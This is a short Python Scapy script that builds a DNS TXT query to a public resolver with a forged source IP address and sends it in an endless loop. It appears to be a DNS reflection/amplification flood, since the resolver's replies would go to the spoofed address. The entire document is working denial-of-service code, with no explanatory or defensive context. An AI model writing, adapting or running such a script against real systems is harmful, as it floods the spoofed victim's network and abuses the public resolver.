#!/usr/bin/env python
from scapy.all import *
a = IP(dst="8.8.8.8",src="47.111.244.170")
b = UDP(dport=53)
c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)
c.qd=DNSQR(qname="test.mcpanel.xyz",qtype="TXT",qclass="IN")
p = a/b/c
while 1:
	send(p)
